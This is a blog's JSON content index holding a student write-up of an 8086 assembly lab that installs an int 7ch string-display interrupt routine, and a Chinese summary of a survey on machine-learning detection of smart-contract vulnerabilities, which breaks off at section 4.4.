[{"title":"helloworld.md","url":"/2025/10/30/helloworld-md/","content":""},{"title":"“汇编语言王爽（第4版）--实验13”","url":"/2025/11/03/%E2%80%9C%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E7%8E%8B%E7%88%BD%EF%BC%88%E7%AC%AC4%E7%89%88%EF%BC%89-%E5%AE%9E%E9%AA%8C13%E2%80%9D/","content":"该实验为编写并安装int 7ch中断例程，显示一个用0结束的字符串，并将中断例程安装到0:200处\n测试程序t1.asm用于触发7ch中断\nassume cs:codedata segment  db &quot;welcome to masm! &quot;,0data endscode segment  start: mov dh,10  mov dl,10  mov cl,2  mov ax,data  mov ds,ax  mov si,0  int 7ch  mov ax,4c00h  int 21hcode endsend start\n\n我们分析一下安装 int 7ch的主要步骤\n\n编写中断例程处理代码\n拷贝整个处理代码到0:200h\n覆盖7ch的地址，使之指向0:200h\n\n由此，可以得到一下代码\nassume cs:codecode segmentstart:  ;复制中断列程处理代码  mov ax,cs  mov ds,ax  mov si,offset do0  mov ax,0  mov es,ax  mov di,200h  mov cx,offset do0End - offset do0  cld  rep movsb  ;修改中断向量表  mov ax,0  mov es,ax  mov word ptr es:[7ch*4],200h  mov word ptr es:[7ch*4+2],0    mov ax, 4c00h ;复制完成后就退出  int 21h  ;实现输出显示在屏幕do0:   mov bl,cl  mov ax,0b800h  mov es,ax  mov di,10*160+36*10 ;屏幕中间显示  mov cx,17  s: mov al,[si]  ;循环从ds中提取数据写入缓冲区  mov ah,bl  mov es:[di],ax  inc si  add di,2  loop s  iretdo0end:  nop  code endsend start\n\n最终呈现效果：\n\n","tags":["learning-rookie"]},{"title":"利用机器学习模型提高智能合约安全性：漏洞和检测方法的调查","url":"/2025/11/07/%E5%88%A9%E7%94%A8%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%A8%A1%E5%9E%8B%E6%8F%90%E9%AB%98%E6%99%BA%E8%83%BD%E5%90%88%E7%BA%A6%E5%AE%89%E5%85%A8%E6%80%A7%EF%BC%9A%E6%BC%8F%E6%B4%9E%E5%92%8C%E6%A3%80%E6%B5%8B%E6%96%B9%E6%B3%95%E7%9A%84%E8%B0%83%E6%9F%A5/","content":"利用机器学习模型提高智能合约安全性：漏洞和检测方法的调查\n智能合约（SCs）是区块链平台上自动执行的程序，正在通过自动化、无需信任的交易改变银行、医疗保健和供应链等行业。然而，它们固有的脆弱性导致了严重的财政和业务损失，大规模的攻击造成了重大的经济损失。机器学习（ML）已经成为一种很有前途的SC漏洞检测方法，但其有效性、适应性和通用性仍未得到充分探索。本文对当前以太坊SC漏洞和攻击进行了全面分类。它还调查了108种基于ml的检测方法，涵盖了传统模型和高级方法的结构化分类，如基于gnn的、基于llm的、对比学习、集成、混合、元学习和迁移学习技术。系统分析了这些方法的优势、局限性和实际挑战，特别关注检测阶段、分类问题、数据集特征、特征工程、性能评估、可泛化性、检测能力、模型老化以及伦理和隐私影响等因素。此外，对SC漏洞的现有数据集进行了审查和整合。通过整合这些见解，这项工作为构建安全、有弹性和值得信赖的SC生态系统提供了可操作的指导方针和基础。\n\n1.概述区块链技术最初于2008年推出，用于支持比特币加密货币，并已发展到支持广泛的应用。基于区块链的应用程序，如分散的医疗监控，可以在不依赖中央机构[6]的情况下实现交易各方之间的直接通信。第二代区块链主要以以太坊为代表，引入了智能合约（SCs），使现实世界的分散应用程序（DApps）能够跨越金融、预测市场和物联网（IoT）等领域。\n虽然有这些优点，SC也面临重大安全挑战。开发人员的有限经验，加上编程语言的缺陷，造成了可利用的漏洞。根据SlowMist的数据，2024年，SC漏洞造成了99起事件和2.14亿美元的损失，截至2025年中期，加密货币总损失约为2.63亿美元。除了金融盗窃，SC法律还允许篡改攻击，例如虚假数据注入，威胁数据完整性。最近的几个高影响漏洞进一步说明了这些风险。\n在2024年，Penpie在其市场创建过程中由于SC逻辑缺陷遭受了2735万美元的漏洞攻击，而Hedgey Finance则因输入验证漏洞损失了4470万美元。在2023年，值得注意的事件包括对Euler Finance的1.97亿美元攻击，对BonqDAO的1.2亿美元漏洞，以及由Vyper编译器漏洞引起的7350万美元的Curve Finance漏洞。这些事件凸显了当前安全措施中持续存在的漏洞。\nSCs的安全性已成为一个突出的研究热点。传统的分析方法，如静态和形式分析、符号执行、混淆和代码合成，已被用于检测漏洞，但它们面临着关键的局限性，包括依赖源代码或局限于已知的漏洞模式。这些差距激发了人们对机器学习（ML）技术的兴趣，这种技术可以推广到固定模式之外，并提供自动化、可扩展和自适应的检测\n然而，选择合适的机器学习范式仍然是一个挑战，因为模型在漏洞检测方面的有效性各不相同。传统的异常检测方法，如一类支持向量机（OCSVM）和隔离森林（IF），已经进行了探索，但往往表现不佳。这些模型依赖于统计异常值检测，无法捕获合约执行逻辑、控制流和合约之间的交互。与欺诈检测不同的是，欺诈检测中的异常通常是数字的，而SC威胁源于执行行为、操作码序列和合约相关性。因此，OCSVM和IF无法检测到诸如重入和交叉合约破坏等漏洞，这些漏洞涉及超出分布偏差的语义不一致\n以太坊是DApps的龙头平台，得到了广泛采用、高交易量和活跃的开发者社区的支持。它也是SC安全研究中研究最多的，特别是基于ml的漏洞检测。虽然大多数基于ml的技术都是为以太坊sc开发的，但许多技术都有可能转移到以太坊虚拟机（EVM）兼容的区块链，如币安智能链（BSC）。相比之下，由于SC设计、共识机制和执行环境的差异，它们对非evm区块链（例如Solana）的适用性仍未得到充分探索。这些限制表明需要专门的基于ml的检测方法，并强调跨链SC安全是一个有前途的研究方向\n先前的工作已经充分地研究了SC安全性，如表1所示。早期的研究根据生命周期阶段和攻击类型提出了SC漏洞的基本分类，并确定了更广泛的SC安全挑战。后来的研究通过分析真实世界的攻击、确定根本原因和评估缓解策略扩大了范围。SC安全性也通过软件开发生命周期的视角进行了研究，突出了合约设计和部署不同阶段的漏洞。其他工作评估了安全工具，比较了检测系统和入侵技术，同时总结了关键限制。为了支持威胁建模和自动化，已经提出了漏洞、漏洞利用和检测方法之间的结构化分类法和映射。最近的研究主要集中在基于机器学习的方法上，提供了对检测模型、数据集和评估框架的全面回顾\n然而，在当前的SC脆弱性分析中，仍然存在一些关键的限制。有限的覆盖仍然是一个挑战，因为新的漏洞不断出现，需要定期进行全面的审查，以监测趋势和评估现有的安全措施。不一致的命名和缺乏标准化的SC漏洞标签阻碍了比较和清晰度。过时或不完整的分类法范围不同，需要整合。漏洞和攻击之间的映射不足仍然是一个问题，因为漏洞经常作为入口点，但是很少有评论系统地将它们与已知的漏洞联系起来。\n\n在基于机器学习的检测领域，仍然存在一些挑战。机器学习解决方案没有按照它们检测到的漏洞进行一致的分类，限制了比较分析。现有的研究往往缺乏对研究差距的全面评估，这是指导未来努力所需要的。基本设计要求有效的基于ml的检测仍未确定。本文解决了这些挑战，并提出了以下关键贡献\n\n提供每个SC漏洞的详细描述，包括相关标签、DASP十大类别和相关攻击。引入了一种新的分类法来按来源对漏洞进行分类：安全问题、编程语言问题或开发问题。这种分类支持三个阶段的SC审核过程，每个阶段由一个专门的团队进行。\n对2018年至2025年3月6日发布的108种基于ML的SC漏洞检测方法，按漏洞类型和ML模型进行了回顾和分类。一种新的分类法将传统方法与高级方法区分开来，后者分为七种类型：基于gnn的、基于llm的、对比学习、集成学习、混合学习、元学习和迁移学习。每项研究在分类类型、数据集、模型、验证策略和关键特征方面进行了系统的比较，为SC漏洞检测中的监督ML提供了当前的结构化参考。\n确定开发有效的基于ml的检测方法的关键因素，并评估当前解决方案如何解决这些问题。概述了机器学习驱动SC漏洞检测的未来研究方向。\n\n本文其余部分的结构如下。第2节调查SC漏洞。第3节回顾了传统的基于ml的检测方法。第4节介绍了基于机器学习的高级方法。第5节讨论了基于ml的检测的设计考虑和未来的研究方向。第六部分对文章进行总结。\n2.智能合约漏洞分类文献中报道了几个SC漏洞，并由网络安全专家进行了分析。这些漏洞在几个方面有所不同，包括行为、严重级别和相关的攻击。本节简要讨论了用于对SC漏洞进行分类的因素，并介绍了文献中确定的漏洞\n2.1 智能合约漏洞类型文献中基于各种因素对SC漏洞进行了分类，如图1所示。一些研究根据其来源将SC漏洞分为三类。这种分类假设漏洞是由编程语言（例如，Solidity）、EVM功能或以太坊架构特征中的缺陷引起的。Qian等人提出了三层分类：solid代码层、EVM执行层和块依赖层。相比之下，Rameder等人根据共享特征将SC漏洞分为十类。\n\nZheng等人根据SC生命周期阶段将SC漏洞分为四组，其中每个阶段都有可能导致漏洞的不同挑战。其他研究人员采用了类似的方法，根据漏洞在以太坊架构层（应用程序、数据、共识和网络）中的位置对漏洞进行分类。大多数已知的SC漏洞发生在应用层。\nnikoliki等人将漏洞按严重程度分为重大危害、慷慨和贪婪。这种分类强调了sc是否可以被任何用户破坏，是否可以将资金泄露给任意用户，是否可以无限期地锁定合同资金。Chen et al.将漏洞根据利用它们的攻击分为五组：未经授权的代码执行、DoS、不公平的收入、双重支出和私钥泄露。Gupta等人将漏洞分为逻辑漏洞和结构漏洞。逻辑漏洞源于开发过程中的业务逻辑错误，而结构漏洞源于技术设计规律。kabla将它们划分为功能、开发和安全级别，而Zhou等人提出了三种替代级别：攻击、程序和机制。\n随着新的漏洞不断出现，开发预防性安全解决方案至关重要。了解每个漏洞的状态，无论是否完全解决，都是至关重要的。Kabla等人将SC漏洞分为三类：已解决、部分解决和仍然开放。该框架有助于研究人员和实践者优先考虑缓解工作。\n网络安全从业者也为SC漏洞探索做出了贡献。2018年，NCC集团推出了去中心化应用程序安全项目（DASP） Top 10，确定了十个最关键的以太坊SC漏洞。不久之后，SC弱点分类（SWC）注册表发布，列出了在Solidity代码中发现的37个漏洞。DASP前10名仅发布一次，而SWC注册表自2020年以来更新有限。2022年，企业以太坊联盟（EEA）发布了EthTrust安全级别规范1，该规范定义了sc的安全要求。2023年，OWASP2社区发布了十大SC漏洞列表，该列表于2025年更新。\n2.2 漏洞映射研究SC漏洞并分析攻击行为对于制定有效的安全解决方案至关重要。与Zhou等人一致，我们发现没有标准参考文献全面涵盖所有报告的SC漏洞，而且许多引用使用了不同的名称。为了解决这个问题，我们在表2、3和4中编写了一个统一的参考，列出了每个漏洞、它的别名、它的DASP十大类别以及相关攻击的示例。\n我们通过整合来自不同来源的漏洞和现实世界的漏洞，扩展了2.1节中讨论的先前的审查，包括同行评审的研究，SWC注册表，DASP Top10， CWE， SlowMist黑客数据库和rek .news。漏洞按根本原因系统分类，并在适用的情况下与一个或多个已记录的漏洞相关联。这种结构化的映射将理论上的漏洞类别与现实世界的攻击场景联系起来。补充资料的表S3提供了所有被引用攻击的详细信息。\n我们观察到SC漏洞通常来自三个来源：安全问题、编程语言限制或开发缺陷。图2说明了这种分类，其目的是通过使团队能够专注于特定的问题类型来简化SC审计。\n3 传统智能合约漏洞检测的ML策略3.1 基于监督ml的检测模型区分良性和脆弱的SCs是一个二元分类任务。S-ML被广泛应用于该任务，因为它能够从标记数据中学习，并且在结构化环境中表现出色。本节回顾了50种现有的基于s - ml的检测方法，并根据它们所处理的漏洞进行了分类。\n3.1.1 庞氏骗局美国证券交易委员会（SEC）将庞氏骗局定义为用新参与者的资金向现有投资者支付回报的骗局。Charles Ponzi于1919年首次提出，其结构类似于金字塔：第一级的用户为第一级的用户提供资金，使早期参与者受益，而后期参与者则遭受损失。当募集放缓或出现大规模撤资时，此类计划就会崩溃。它们分为树形、链形、瀑布形和交接型。sc使自动化，增加投资者风险和威胁区块链安全。补充材料表S4总结了基于ml的庞氏骗局 SC检测方法。\n\n\n研究强调了基于代码和基于交易的特征在检测庞氏SCs和零日攻击方面的有效性。XGB模型表明，庞氏检测在没有源代码的情况下是可行的，通过结合操作码和交易特征提高了性能。RF比XGB实现了更高的方差减少，并且可以在使用操作码特征部署后立即检测庞氏合约，但这两个模型都依赖于单一操作码频率，忽略了代码语义。基于代码的零日功能优于基于交易的功能（RF召回率：96% vs. 84%）。CatBoost和J48也达到了97%的召回率，具有排名第一的功能是基于代码.庞氏合约经常模仿交易特征中的正常行为，从而增加了错误分类的风险.\n\n结合AST和基于交易的特征改进了DT、SVM和Multinomial NB (MNB)，每个都达到了94%的召回率，MNB总体上略好。来自源代码、操作码和交易数据的TF-IDF向量等混合特征增强了gb和ET的软投票集合，实现了89.67%的准确率和2.14%的FPR。在三个精心设计的数据集上进行的测试表明，删除非贡献行为特征可以提高性能，但召回率仍低于49%。具有纯代码和混合特征的基于射频的模型显示了交易数据的边际收益（召回率提高约2%）。ADASYN过采样与AdaBoost对3克操作码特征仍然产生适度的正类召回。\n\n关键的见解:\n\n集成学习不断提高检测性能。\n操作码和字节码特征，结合有效的特征选择，对于准确和早期检测至关重要。\n处理数据泄漏和类不平衡对于可靠的检测至关重要。\n\n\n3.1.2 钓鱼和欺诈传统的网络钓鱼攻击通过欺骗电子邮件或网站来获取敏感信息。在以太坊中，网络钓鱼利用平台的去中心化造成直接的经济损失，通常通过电子邮件、网站或社交媒体分发恶意地址。蜜蜂代币ICO骗局在25小时内被盗超过100万美元，证明了它们的快速影响。已经提出了几种基于ml的检测方法来解决这个问题，如补充材料表S5所示。\n基于图的级联特征提取方法将事务建模为帐户关系，并提取多跳特征。通过过滤大多数类和应用基于lightgbm的双采样集成来解决类不平衡问题。虽然优于标准ml方法，但该模型的整体性能仍然有限。同样，在超过2000万个以太坊交易上训练的网络钓鱼检测模型通过过滤缓解了类不平衡，并使用了两种特征类型：基于账户（活动模式）和基于网络（结构）。AdaBoost的AUC最高，为92.76%，而SVM和KNN表现较差。用一个模拟异常节点的隐藏网络钓鱼框架进行测试，结果表明对规避技术的鲁棒性有限。\n\nEth-PSD用于检测使用84,664个以太坊交易的网络钓鱼骗局。通过复制网络钓鱼样本来平衡数据集，并使用多种排序技术进行特征选择。60倍交叉验证的KNN准确率为98.11%，FPR为0.9%。输入、块高度和时间戳被认为是最有信息的特征。结合历史账户活动、网络架构特征和过采样改进的集成模型。然而，缺乏类分布报告降低了调查结果的可靠性。\n在包含14个特征和4个标签的数据集上，RF的准确率为98.8%，FPR为0.05%，仅包含20%的异常事务。虽然主要目标是数据集构建，但结果表明集成模型在不平衡数据上表现良好。\n在去中心化交易所（DEXs）的背景下，当开发商推出毫无价值的代币并在吸引投资者后撤回流动性时，就会发生“拉跌”。提出了一种XGB模型，通过分析Uniswap事件和令牌特征来检测此类诈骗。该模型针对的是池创建后的第一个24小时，因为大约93%的拉地毯事件发生在这个时间段内。早期检测实现了78.90%的召回率，尽管早期性能有所下降，但仍突出了机器学习预防诈骗的潜力。\n\n关键的见解:\n\n集成模型优于单个分类器，特别是当与有效的特征选择和不平衡处理相结合时。\n处理数据不平衡并应用适当的验证技术，如过采样、特征过滤和双采样集成，可以显着提高分类精度。\n区块链特定的功能对于检测至关重要，为网络钓鱼识别提供了强大的预测能力。\n\n\n3.1.3 非法账户许多恶意活动，如庞氏骗局、冒充和彩票骗局，都源于非法账户；早期发现对于减少欺诈至关重要。已经提出了几种ML方法，如补充材料的表S6所总结。对XGB模型中最重要特征的评估表明，帐户第一次和最后一次交易之间的时间是识别其合法性的最具影响力的因素。非法账户的平均使用天数为38.4天，而合法账户的平均使用天数为136.9天。\n在使用相同平衡数据集的研究中，LGBM模型在检测欺诈性以太坊账户方面始终表现出卓越的性能。去除不相关的特征将模型的f1得分提高到高达99%，并且使用10倍交叉验证进一步提高了可靠性。然而，平衡的职业分布并不代表现实世界的情况。为了解决这个问题，在不平衡数据集上训练的检测模型也被探索。RF在历史账户数据上表现出优异的性能，但缺乏验证限制了其泛化性。\n每种类型的以太坊账户都具有不同的特征和动态交易行为，使账户活动成为账户类型的有用指标。使用历史活动数据的多类分类提高了集成模型在平衡数据上的性能，尽管观察到覆盖的迹象。XGB在不平衡数据集上取得了最好的效果；然而，只有4371个账户的有限样本量降低了普遍性。\n对自我网络微观子网特征的分析表明，非法账户之间存在差异。庞氏骗局账户的聚类系数低于网络钓鱼账户。结合子网和动态事务特性，提高了射频性能。然而，阶级分布严重倾斜，非法账户占88%，与现实情况相比，这是一个不现实的比例。\n\n关键的见解:\n\n基于增强的集成模型，特别是LGBM和XGB，是检测非法帐户的最有效方法之一\n特征选择和数据集平衡是提高准确率的关键；删除不相关的特性和维护实际的类分布有助于防止重写。\n小或不平衡的数据集限制了模型的泛化性，强调了反映真实世界非法账户分布的数据集的必要性。\n\n\n3.1.4 蜜罐合约蜜罐合约是欺骗性的sc，似乎很容易引诱攻击者，从而通过隐藏的逻辑将他们困住。2019年，共有240名用户被此类攻击利用，获利超过9万美元。这些合约诱使攻击者窃取以太币，最终耗尽他们自己的资金。在某些情况下，如彩票合同，蜜罐也会损害良性用户。补充材料表S7总结了现有的检测方法。\n由于蜜罐必须是可公开访问的才能吸引受害者，检测模型利用了基于代码的特征。LightGBM是在操作码n图特征上进行训练的，其中组合单图和双图产生了最好的结果，而添加三图只产生了边际改进。XGB混合使用了基于代码、基于事务和资金的特征。基于事务的特征单独表现最好，但当所有特征类型组合在一起时，准确性得到提高。关键特性包括合约创建者的存款频率、平均交易价值和代码长度。\n以前的方法依赖于攻击后的特征（例如，余额，调用者）或仅在执行后可用的交易历史。相比之下，改进的XGB模型排除了这些特征，并使用了通过TF-IDF和word2vec提取的基于字节码的特征。使用word2vec和TF-IDF，模型的pr - auc分别为90.1%和89.2%；然而，word2vec的计算成本更高。主要特征包括存款频率和余额检查，通常存在于蜜罐合同中，以评估受害者的余额。\n\n关键的见解\n\n基于增强的集成模型（如XGB和LGBM）显示出较高的检测精度。\n特征选择至关重要；结合操作码和基于事务的特性可以提高性能。\n早期检测受限于对执行后特性的依赖。基于字节码的特性很有前途，但计算成本很高。\n\n\n3.1.5 重入补充材料表S8中总结的研究解决了这种可能消耗合同资金的高影响脆弱性。动态检测框架Dynamit由两个组件组成：一个跟踪事务的监视器和一个使用行为特征和ML模型将它们分类为良性或恶意的检测器。在包含105个事务的平衡数据集上训练了6个分类器。RF实现了最高的精度（90%），当忽略平均调用堆栈深度特征时，其精度增加到94%。然而，小数据集限制了可泛化性。另一项研究提出了一个基于dl的框架，该框架将源代码分析与合同片段表示相结合，以提取语义相关的语句，并将合同分类为易受攻击或非易受攻击。这种方法有效地捕获了SC代码中的顺序和上下文模式，获得了88.26%的f1分数。\n\n关键的见解\n\nRF优于单个分类器，但其有效性受到小数据集和中等精度的限制。\nDL模型在SC代码中捕获时间模式，尽管它们目前的性能不足以用于实际部署。\n\n\n3.1.6 拒绝服务DoS是一种网络攻击，它破坏了对预期服务的访问。针对sc的各种类型的DoS攻击如表2和表4所示，相应的检测方案如补充资料表S10所示。\nSCSCAN支持两种扫描模式：Single和Batch。它采用模式匹配来检测各种SC漏洞，而DoS则使用SVM模型单独识别。该框架识别漏洞，并按颜色编码的安全级别对契约进行排序。由于在不平衡的数据集上进行训练，除了DoS（92%）之外，它对所有测试漏洞都实现了100%的检测。\n以太坊交易分析被用来检测2000个交易数据集上的低价DoS攻击，其中10%是恶意的。使用几种技术解决了类不平衡问题，其中过采样和SMOTE产生了最佳性能。DT达到了98%以上的召回率，而SVM表现最差，基于投票的模型没有达到预期。低价DoS攻击使以太坊平均交易等待时间增加了42%以上，这是一个关键的检测功能。\n\n关键的见解\n\n集成模型，特别是RF，在检测DoS攻击方面优于其他分类器。\n通过重采样技术（如过采样和SMOTE）解决数据不平衡问题，可以显著提高检测性能。\n特征选择至关重要；交易延迟是DoS价格过低的一个有力指标，强调了行为分析的价值。\n\n\n3.1.7 多重漏洞几种多漏洞检测方法旨在提高实际场景下的效率和覆盖率，如补充材料表S9所示。SoliAudit[96]使用操作码特征检测DASP十大SC漏洞，并在两种配置下进行评估：(1)n-gram与TF-IDF和七个传统ML模型进行二元分类，(2)Word2Vec与CNN进行多标签检测。两种配置都达到了高达90%的精度，TF-IDF和LR表现最好。一项后续研究证实TF-IDF是CNN分类器中Word2Vec、FastText和BoW中最有效的表示。\nxFuzz通过预测易受攻击的合约并使用模糊器扫描它们，将ML与模糊相结合，减少了搜索空间和执行时间。它检测了重入性、Tx-origin和delegatcall漏洞，而solidaudit则专注于算术和重入性。每个漏洞独立训练的基于ast的模型报告了不同的结果，平均f1得分为79%，尽管有限的数据和薄弱的验证降低了通用性。Eth2Vec应用基于nlp的EVM字节码相似性，对代码重写具有鲁棒性，但表现不佳，f1得分为57.5%。\nContractWard在早期工作的基础上，使用操作码双字符检测易受攻击的SCs。在49,502个SCs上使用One-vs-Rest策略测试了五个ML模型，六个漏洞标签的阈值为0.5。为了解决阶级不平衡问题，我们评估了两种抽样方法。使用SMOTETomek的XGB获得了最佳性能，在Macro-和micro - f1得分中超过96%，平均每SC检测时间为45秒，但无法检测到看不见的漏洞。一个相关的基于ast的模型通过比较solidfi -benchmark和SmartBugs中子节点的结构相似性，确定了8种漏洞类型。KNN的表现优于SGD，在所有指标上都达到90.10ś96.67%，超过了SmartCheck和Oyente。尽管结果很好，但有限的训练数据阻碍了推广和新漏洞的检测。\n使用增强型遗传算法（EGA）的集成框架从AST、操作码、字节码和ABI视图中提取了240个特征，并选择了前80个。对111,897个sc进行了评估，它对11种漏洞类型进行了多类分类，尽管召回率仍然中等（41ś69%）。基于ast的轻量级CNN解决了物联网资源约束问题，实现了95.23%的重入召回率。sGuard[51]结合了基于ml的检测和基于规则的修复，使用签名和缓解功能针对五种漏洞类型。虽然性能有所不同，但它在未检查调用返回值、原点和重入性方面分别实现了96%、94%和90%的召回。\nSC漏洞检测的最新进展强调混合和多模态DL框架，以提高准确性、鲁棒性和可扩展性。使用CodeBERT融合了操作码和源代码的特征，以实现高精度的异常检测。DeeSCVHunter将操作码序列和控制低图与BiLSTM和LSTM模型集成在一起，使用自关注来捕获语法和语义特征。COBRA采用字节码级方法，将基于gru的顺序建模与多尺度上下文感知模块相结合，以丰富特征表示。MODNN采用具有多目标学习的模块化深度神经网络，融合BERT嵌入的语义特征和操作码共现矩阵的结构模式，检测12种漏洞类型。\n将字节码图像、契约图和专家定义的特征与VGG16、GRU、AutoInt和DCN集成在一起的统一框架的准确率超过96%。通过Word2Vec嵌入操作码并应用Bi-GRU、Transformer和注意力增强cnn的混合模型扩展了检测能力。使用TF-IDF和基于合成模式训练的MLP的轻量级解决方案实现了91.27%的f1得分。CodeNet通过无步进CNN将字节码作为图像处理，以保持操作码局部性。一个多模态框架结合了跨源、编译和字节码表示的白盒测试，利用BiLSTM、textCNN和RF实现84种检测策略，准确率高达99.71%。\n\n关键的见解\n\n集成和深度学习模型在多漏洞检测方面优于传统分类器，尽管没有一个在所有类型中都表现出色。\n特征提取强烈影响检测；TF-IDF和AST相似度等方法通常优于深度嵌入。\n尽管最近的模型显示出对未知情况的改进的适应性，但跨漏洞类型的泛化仍然具有挑战性。\n混合和多模式模型通过集成不同的特性来增强灵活性，但它们的成功依赖于架构和数据质量。\n\n\n3.2 基于无监督ml的检测模型无监督机器学习（U-ML）在没有标记数据的情况下发现模式和异常。在SC分析中，U-ML方法检测代码结构、执行行为和事务模式的变化。聚类组通过结构相似性收缩以发现异常值，而异常检测滞后于可能表明开采的不规则气体使用或函数调用。尽管有这些功能，由于假阳性率高、操作码敏感和效率低，U-ML很少被采用。研究表明，U-ML经常将良性行为错误地分类为恶意行为。例如，Lorenz等人发现IF和Local Outlier Factor难以区分非法交易和合法交易。同样，聚类也受到操作码多样性和编译器不一致性的影响，降低了可泛化性。\n为了解决这些问题，Huang等人引入了一个基于图嵌入的字节码匹配框架。虽然对噪声和编译器不一致有效，但它仍然依赖于与已知模式的相似性，缺乏检测新漏洞的能力。更根本的是，U-ML技术不能可靠地捕获不表现为统计异常的上下文相关漏洞。由于缺乏语义理解，这些模型经常将无害的偏差错误地分类为威胁。\n经验证据突出了U-ML的局限性。OC-Detector仅获得56%的f1得分，而用于重入检测的深度聚类方法[162]报告的得分低至7.1%ś9.5%，使得U-ML不适合精确的SC漏洞识别。计算需求带来了额外的挑战。虽然基本方法（如k-means）是有效的，但复杂模型（如深度聚类）可能超出S-ML的资源需求，阻碍了约束环境中的实时检测。此外，缺少标签会使验证变得复杂。尽管有这些缺点，当标记数据不可用时，U-ML仍然有希望识别未知或零日SC漏洞。未来的工作应该探索将U-ML的异常检测与S-ML的分类精度相结合的混合模型\n4 SC漏洞检测的高级ML方法本节回顾了SC漏洞检测的高级ML技术，包括图神经网络（gnn），基于变压器的架构（例如，llm），元学习和混合方法。\n4.1 GNN-Based方法gnn是为图结构数据设计的，可以有效地捕获节点之间的复杂关系，使其非常适合SCs，可以用图编码控制低、数据依赖和函数调用来表示。补充材料的表S11总结了最近基于gnn的SC漏洞检测方法。\n一些模型通过集成控制层和语义上下文来增强图级表示。ContractGNN引入了漏洞子图（Vulnerability Sub-Graphs, vsg）来隔离cfg的关键区域。SCVHunter采用异构GAT （HGAT）来突出语义上重要的节点，在47,587个sc中，在重入性和时间戳依赖上实现了93.72%和91.07%的准确率。DA-GNN结合了基于gru的语义注意和基于gat的结构注意，在17670个SCs上超过了gcn和gru。多标签GNN使用Sent2Vec嵌入和CFGs来检测单个SC内的多种漏洞类型。\n其他模型融合了异构表示，以实现更深层次的语义理解。EtherGIS对六种漏洞类型的属性cfg应用TopK池。HG-Detector通过异构GNN集成了ast、CFGs和call graphs，实现了高达10.06%的精度提高和2.29%的f1得分增益。Cai等人通过将AST、CFG和PDG与程序切片和bi - ggnn结合起来扩展了这一点。\n特定领域和混合gnn扩大了适用性。HARDEN将GCNs应用于操作码图，用于DeFi中的可重入性检测。Peculiar将数据低图与预训练的Transformer相结合。MANDO引入了bi - ggnn的多级嵌入，而MANDO- hgt则增加了变压器层和元关系建模。StateGuard使用ast衍生的图来检测DEX合约中的状态脱轨缺陷，在5,671个sc上获得了94.25%的f1得分。\n\n关键的见解\n\ngnn通过对结构和语义关系建模，超越了静态和模糊方法，增强了SC漏洞检测。\n基于注意力和异构gnn（例如，HG-Detector, SCVHunter）通过优先考虑语义上重要的节点和关键漏洞来提高准确性。\n多标签gnn通过识别单个SC中的多种漏洞类型来扩展检测范围。\n\n\n4.2 LLM 方法llm具有高级的代码理解和推理能力，为Slither等基于规则的工具提供了数据驱动的替代方案。与静态启发式不同，llm利用上下文学习和模式识别来检测预定义签名之外的漏洞。补充材料表S12总结了基于llm的SC漏洞检测方法。\n微调模型，如DistilBERT和BERT-ATT-BiLSTM显示出强大的性能。BERT-ATT-BiLSTM在随机平衡数据集上达到了86.67%的f1得分，而DistilBERT达到了97%的准确率。然而，小样本量（520 SCs）引起了对覆盖和有限泛化的担忧。\n像PonziSleuth这样基于gpt -3.5 turbo构建的zero-shot模型，利用预训练的知识绕过了直线调谐，在检测庞氏骗局时达到了96.06%的平衡准确率。尽管如此，由于有限的任务适应，他们仍在与模糊的漏洞作斗争。多模态方法，如QuadraCode AI，结合源代码、字节码和操作码来增强鲁棒性，但增加了计算开销，限制了实时部署。\n许多基于llm的方法依赖于合成数据集或小数据集，导致偏差和弱泛化。类不平衡进一步降低了对罕见漏洞的检测准确性。可解释性是另一个挑战，因为llm作为黑盒模型运行，不像具有可追溯输出的传统工具。效率也存在问题：像ft - codellam - 13b这样的大型模型只能达到34%的准确率，强调了规模和可部署性之间的权衡。此外，微调大模型是资源密集型的，限制了它们在SC审计中的实时使用。\n将llm与符号执行相结合可以提高对新威胁的适应性。参数高效微调（PEFT）方法，包括LoRA和适配器调谐，旨在降低训练成本，同时保持性能，尽管它们在SC检测中的应用仍未得到充分探索。用真实世界契约和对抗性示例扩展训练数据集可以提高泛化能力。虽然llm在适应性和模式识别方面优于传统工具，但在数据集质量、可解释性和可扩展性方面仍然存在挑战。数据集多样性、混合模型和高效调优的进步是实现鲁棒性和可解释的基于llm的SC漏洞检测的关键。\n\n关键的见解\n\n基于llm的检测提供了强大的模式识别，但由于数据集小，合成或不平衡而缺乏泛化。\n集成传统的分析提高了准确性，但增加了复杂性，突出了对XAI和高效的优化方法的需求\n\n\n4.3 对比学习方法对比学习（CL）是一种突出的表征学习策略，它可以在不需要人工标记的情况下提取判别性和不变性特征。它通过优化正、负样本对的对比损失，在嵌入空间中将相似的实例投影得更近，而将不相似的实例投影得更远。在SC分析中，CL支持鲁棒特征学习，增强了漏洞检测能力。\n最近的研究，总结在补充材料的表S13中，将CL应用于各种SC漏洞。ContraPonzi使用一种基于自监督graphsage的编码器，其正对由同一SC的多版本编译字节码形成，而负对则来自不同SC。这种增强捕获了不变语义，性能优于所有基线。\n基于transformer的框架通过从漏洞标签构造对比对，将标签相同的合约分组为阳性，标签不同的合约分组为阴性，从而实现多类检测。该模型通过掩模语言建模（mask Language Modeling， MLM）集成了上下文增强，获得了94.52%的f1分数，优于基于规则和神经基线。ACAD侧重于使用图中心性引导的自适应CL进行重入和无限环路检测。结构增强，如边缘去除和特征掩蔽，选择性地应用以及提前停止，以提高稳定性。ACAD在Reentrancy上达到了93.87%的f1得分，但由于有限的标记数据，在infinite Loops上的表现较低。\n\n关键的见解\n\nCL方法通过从图结构数据或源代码中学习判别特征来改进SC漏洞检测。\n它们的性能取决于增强设计和自我监督策略，以减轻有限的标记数据。\n\n\n4.4 